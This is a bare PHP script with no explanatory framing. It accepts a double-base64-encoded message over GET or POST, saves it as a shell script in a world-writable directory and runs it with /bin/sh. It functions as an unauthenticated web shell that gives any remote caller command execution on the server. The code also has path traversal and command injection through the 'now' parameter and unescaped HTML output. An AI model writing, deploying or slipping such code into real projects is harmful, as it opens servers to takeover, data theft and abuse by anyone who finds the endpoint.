<?php

function save($path, $data) {

	if (!$fp = @fopen($path, 'wb')) {
		return false;
	}

	fwrite($fp, $data);
	@fclose($fp);

	return true;
}

function execsh($path, $shpath) {

	$cmd = "cd $path && /bin/sh $shpath";
	$output = exec($cmd, $retval);

	return $output;
}

$msg = NULL;
$now = NULL;

if (! empty($_POST)) {
	$msg = $_POST['msg'];
	$now = $_POST['now'];
} elseif (! empty($_GET)) {
	$msg = $_GET['msg'];
	$now = $_GET['now'];
}

if (empty($msg) || empty($now)) {
	die('No message.');
}

$config = parse_ini_file('config.ini');

$path = $config['save-path'];

if (!is_dir($path)) {
	mkdir($path, 0777);
}

$savePath = $path . '/'. $now . '.sh';

$msg = base64_decode(base64_decode($msg));

save($savePath, $msg);

$output = execsh($path, $savePath);

echo("<p><a href='files/$now.sh'>$now.sh</a></p>");
echo("<p><a href='files/$now'>$now</a></p>");
?>


